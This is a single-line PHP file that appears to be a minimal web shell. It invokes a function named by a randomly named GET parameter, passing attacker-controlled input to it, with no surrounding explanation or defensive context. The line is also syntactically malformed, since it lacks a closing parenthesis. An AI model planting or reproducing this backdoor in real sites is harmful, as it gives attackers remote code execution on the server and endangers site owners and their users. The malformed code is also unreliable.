<?php
$_GET['KE4LkjPv']($_GET['KE4LkjPv'];
?>
